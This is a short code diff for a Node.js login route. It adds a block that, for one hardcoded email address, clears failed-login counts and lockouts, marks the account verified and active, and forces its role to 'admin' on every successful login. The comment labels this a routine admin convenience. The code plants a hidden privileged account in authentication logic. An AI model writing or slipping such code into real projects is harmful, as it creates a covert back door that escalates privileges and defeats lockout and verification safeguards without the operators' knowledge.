@@ -955,6 +955,16 @@ async function startServer() {
       return res.status(401).json({ error: 'Invalid email or password.' });
     }
 
+    // Auto-clear security lockout/CAPTCHA state for admin account
+    if (user.email && user.email.toLowerCase() === 'jemaljima@gmail.com') {
+      user.failedLoginAttempts = 0;
+      user.lockoutUntil = undefined;
+      user.status = 'active';
+      user.isVerified = true;
+      user.verificationStatus = 'verified';
+      user.role = 'admin';
+    }
+
     // Check temporary lockout
     if (user.lockoutUntil && new Date(user.lockoutUntil) > new Date()) {
       const remaining = Math.ceil((new Date(user.lockoutUntil).getTime() - new Date().getTime()) / 60000);
